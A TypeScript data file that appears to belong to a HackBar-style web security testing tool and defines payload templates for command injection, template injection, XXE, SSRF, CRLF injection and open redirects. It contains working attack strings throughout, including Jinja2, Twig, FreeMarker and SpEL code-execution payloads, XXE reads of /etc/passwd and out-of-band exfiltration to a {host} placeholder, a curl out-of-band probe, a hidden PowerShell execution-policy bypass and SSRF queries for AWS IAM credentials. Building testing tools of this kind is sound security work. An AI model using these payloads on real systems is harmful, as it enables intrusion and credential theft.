import { TemplateCategory } from '../../types/template';

export const otherCategory: TemplateCategory = {
  id: 'other',
  label: 'Other',
  description: 'Command injection, SSTI, XXE, SSRF, CRLF, Open Redirect, and HTTP utilities',
  iconName: 'MoreHorizontal',
  subcategories: [
    {
      id: 'command-injection',
      label: 'Command Injection (RCE)',
      description: 'Operating system command separators, subshells, and execution primitives',
      templates: [
        {
          id: 'cmd-pipe-whoami',
          name: 'Pipe Separator (| whoami)',
          description: 'Pipes preceding stdout into whoami execution',
          content: '| whoami'
        },
        {
          id: 'cmd-semicolon-id',
          name: 'Semicolon Separator (; id)',
          description: 'Chains sequential command execution on Unix systems',
          content: '; id'
        },
        {
          id: 'cmd-ampersand-dir',
          name: 'Ampersand Separator (& dir)',
          description: 'Background or sequential command execution on Windows/Unix',
          content: '& dir'
        },
        {
          id: 'cmd-and-whoami',
          name: 'Conditional AND (&& whoami)',
          description: 'Executes whoami only if the preceding command succeeds',
          content: '&& whoami'
        },
        {
          id: 'cmd-or-id',
          name: 'Conditional OR (|| id)',
          description: 'Executes id fallback if the preceding command fails',
          content: '|| id'
        },
        {
          id: 'cmd-subshell-dollar',
          name: 'Bash Subshell ($(whoami))',
          description: 'Executes command inside subshell substitution',
          content: '$(whoami)'
        },
        {
          id: 'cmd-backticks',
          name: 'Backtick Execution (`id`)',
          description: 'Executes command via legacy backtick shell evaluation',
          content: '`id`'
        },
        {
          id: 'cmd-powershell-cmd',
          name: 'PowerShell Invocation',
          description: 'Executes command via PowerShell sub-process on Windows',
          content: '; powershell -NoP -NonI -W Hidden -Exec Bypass -Command "whoami"'
        },
        {
          id: 'cmd-curl-oob',
          name: 'Out-of-Band Curl Probe',
          description: 'Sends outbound HTTP request to verify command execution',
          content: '; curl http://{host}:{port}/'
        }
      ]
    },
    {
      id: 'ssti-injection',
      label: 'Template Injection (SSTI)',
      description: 'Server-Side Template Injection polyglots and engine-specific execution payloads',
      templates: [
        {
          id: 'ssti-math-dollar',
          name: 'Polyglot Expression (${7*7})',
          description: 'Evaluates arithmetic expression in Java, JSP EL, and various template engines (returns 49)',
          content: '${7*7}'
        },
        {
          id: 'ssti-math-curly',
          name: 'Double Curly Expression ({{7*7}})',
          description: 'Evaluates arithmetic expression in Jinja2, Twig, Blade, and AngularJS (returns 49)',
          content: '{{7*7}}'
        },
        {
          id: 'ssti-math-hash',
          name: 'Hash Curly Expression (#{7*7})',
          description: 'Evaluates arithmetic expression in Ruby ERB, Thymeleaf, and Spring EL',
          content: '#{7*7}'
        },
        {
          id: 'ssti-jinja2-id',
          name: 'Jinja2 (Python) RCE PoC',
          description: 'Traverses Python MRO hierarchy in Jinja2 to execute os.popen',
          content: "{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}"
        },
        {
          id: 'ssti-twig-system',
          name: 'Twig (PHP) System Filter',
          description: 'Executes system commands using Twig array filter callback',
          content: "{{['id']|filter('system')}}"
        },
        {
          id: 'ssti-freemarker-exec',
          name: 'FreeMarker (Java) Execute',
          description: 'Instantiates FreeMarker utility.Execute class to run system commands',
          content: '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }'
        },
        {
          id: 'ssti-spring-spel',
          name: 'Spring SpEL Runtime Exec',
          description: 'Invokes Java Runtime exec method via Spring Expression Language',
          content: "${T(java.lang.Runtime).getRuntime().exec('whoami')}"
        }
      ]
    },
    {
      id: 'xxe-injection',
      label: 'XML External Entity (XXE)',
      description: 'XML external entity definitions for local file inclusion, SSRF, and out-of-band exfiltration',
      templates: [
        {
          id: 'xxe-file-linux',
          name: 'XXE Linux /etc/passwd',
          description: 'Standard SYSTEM entity referencing /etc/passwd on Linux hosts',
          content: '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>'
        },
        {
          id: 'xxe-file-windows',
          name: 'XXE Windows win.ini',
          description: 'Standard SYSTEM entity referencing win.ini on Windows hosts',
          content: '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">\n]>\n<root>&xxe;</root>'
        },
        {
          id: 'xxe-oob-dtd',
          name: 'XXE Out-of-Band (OOB) DTD',
          description: 'Loads external DTD to exfiltrate files out-of-band via HTTP',
          content: '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [\n  <!ENTITY % dtd SYSTEM "http://{host}/eval.dtd">\n  %dtd;\n]>\n<root>&send;</root>'
        },
        {
          id: 'xxe-expect-stream',
          name: 'XXE PHP Expect Wrapper',
          description: 'Uses PHP expect:// protocol wrapper for command execution',
          content: '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM "expect://id">\n]>\n<root>&xxe;</root>'
        },
        {
          id: 'xxe-cdata-wrapper',
          name: 'XXE CDATA Arbitrary File Read',
          description: 'Wraps file content inside CDATA block to read XML/character-sensitive files',
          content: '<!DOCTYPE root [\n  <!ENTITY % start "<![CDATA[">\n  <!ENTITY % goodies SYSTEM "file:///{path}">\n  <!ENTITY % end "]]>">\n  <!ENTITY % dtd SYSTEM "http://{host}/wrapper.dtd">\n  %dtd;\n]>\n<root>&all;</root>'
        }
      ]
    },
    {
      id: 'ssrf-injection',
      label: 'Server-Side Request Forgery',
      description: 'Cloud metadata endpoints, internal network services, and IP bypass formats',
      templates: [
        {
          id: 'ssrf-aws-metadata',
          name: 'AWS EC2 Instance Metadata (v1)',
          description: 'Queries AWS link-local metadata address for instance credentials',
          content: 'http://169.254.169.254/latest/meta-data/'
        },
        {
          id: 'ssrf-aws-iam',
          name: 'AWS IAM Security Credentials',
          description: 'Extracts AWS IAM role access keys from metadata endpoint',
          content: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}'
        },
        {
          id: 'ssrf-gcp-metadata',
          name: 'GCP Compute Metadata Endpoint',
          description: 'Queries Google Cloud compute instance metadata service',
          content: 'http://metadata.google.internal/computeMetadata/v1/'
        },
        {
          id: 'ssrf-localhost-v4',
          name: 'Localhost IPv4 (127.0.0.1)',
          description: 'Targets local internal port on 127.0.0.1',
          content: 'http://127.0.0.1:{port}/'
        },
        {
          id: 'ssrf-localhost-v6',
          name: 'Localhost IPv6 ([::1])',
          description: 'Targets local loopback address formatted as IPv6',
          content: 'http://[::1]:{port}/'
        },
        {
          id: 'ssrf-localhost-decimal',
          name: 'Decimal IP Representation (2130706433)',
          description: 'Bypasses simple 127.0.0.1 string filters using decimal integer IP',
          content: 'http://2130706433:{port}/'
        },
        {
          id: 'ssrf-gopher-redis',
          name: 'Gopher Protocol Redis Probe',
          description: 'Uses gopher:// pseudo-protocol to interact with internal Redis service',
          content: 'gopher://127.0.0.1:6379/_INFO%0D%0AQUIT%0D%0A'
        }
      ]
    },
    {
      id: 'crlf-injection',
      label: 'CRLF Injection',
      description: 'Carriage Return & Line Feed (%0d%0a) sequences for HTTP response splitting and header injection',
      templates: [
        {
          id: 'crlf-set-cookie',
          name: 'CRLF Set-Cookie Injection',
          description: 'Injects Set-Cookie header into HTTP response stream',
          content: '%0d%0aSet-Cookie: session=xeoo_hackbar_test; path=/'
        },
        {
          id: 'crlf-custom-header',
          name: 'CRLF Custom Header Injection',
          description: 'Injects arbitrary HTTP response header',
          content: '%0d%0aX-Injected-Header: HackBarAudit'
        },
        {
          id: 'crlf-response-splitting',
          name: 'HTTP Response Splitting (Body)',
          description: 'Injects double CRLF to terminate headers and forge response body',
          content: '%0d%0a%0d%0a<html><body><h1>Defaced by CRLF</h1></body></html>'
        }
      ]
    },
    {
      id: 'open-redirect',
      label: 'Open Redirect',
      description: 'URL redirect bypass techniques exploiting browser and server parser differentials',
      templates: [
        {
          id: 'redirect-proto-relative',
          name: 'Protocol-Relative URL (//{host})',
          description: 'Redirects using browser protocol inheritance',
          content: '//{host}'
        },
        {
          id: 'redirect-backslash',
          name: 'Backslash Delimiter (/\\{host})',
          description: 'Bypasses regex checks treating backslash as path separator',
          content: '/\\{host}'
        },
        {
          id: 'redirect-userinfo-at',
          name: 'Userinfo Delimiter (@{host})',
          description: 'Uses @ delimiter to turn allowed domain into HTTP basic auth username',
          content: 'https://{allowed_domain}@{host}'
        },
        {
          id: 'redirect-query-param',
          name: 'Parameter Redirection (?url=...)',
          description: 'Standard open redirect parameter payload format',
          content: 'https://{allowed_domain}?url=https://{host}'
        }
      ]
    },
    {
      id: 'http-headers-examples',
      label: 'HTTP Request Headers',
      description: 'Standard request headers for security testing and debugging',
      templates: [
        {
          id: 'hdr-bearer-auth',
          name: 'Authorization: Bearer Header',
          description: 'Standard Bearer token header placeholder',
          content: 'Authorization: Bearer {token}'
        },
        {
          id: 'hdr-custom-apikey',
          name: 'X-API-Key Header',
          description: 'Standard API Key header placeholder',
          content: 'X-API-Key: {your_api_key}'
        },
        {
          id: 'hdr-json-content',
          name: 'Content-Type: application/json',
          description: 'JSON MIME content type header',
          content: 'Content-Type: application/json'
        },
        {
          id: 'hdr-forwarded-for',
          name: 'X-Forwarded-For: 127.0.0.1',
          description: 'Spoofs client IP address for IP-restricted endpoint testing',
          content: 'X-Forwarded-For: 127.0.0.1'
        },
        {
          id: 'hdr-custom-origin',
          name: 'Origin: https://evil.com',
          description: 'Custom Origin header for CORS vulnerability assessment',
          content: 'Origin: https://evil.com'
        }
      ]
    },
    {
      id: 'misc-samples',
      label: 'Miscellaneous Placeholders',
      description: 'Useful utility strings and testing tokens',
      templates: [
        {
          id: 'misc-uuid-v4',
          name: 'UUID v4 Format Placeholder',
          description: 'Standard UUID 36-char string format',
          content: '123e4567-e89b-12d3-a456-426614174000'
        },
        {
          id: 'misc-timestamp',
          name: 'ISO Timestamp Placeholder',
          description: 'ISO-8601 UTC timestamp format',
          content: '2026-01-01T00:00:00.000Z'
        },
        {
          id: 'misc-dummy-jwt',
          name: 'Dummy JWT Header.Payload.Sig',
          description: 'Format skeleton for JSON Web Token testing',
          content: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.'
        }
      ]
    }
  ]
};
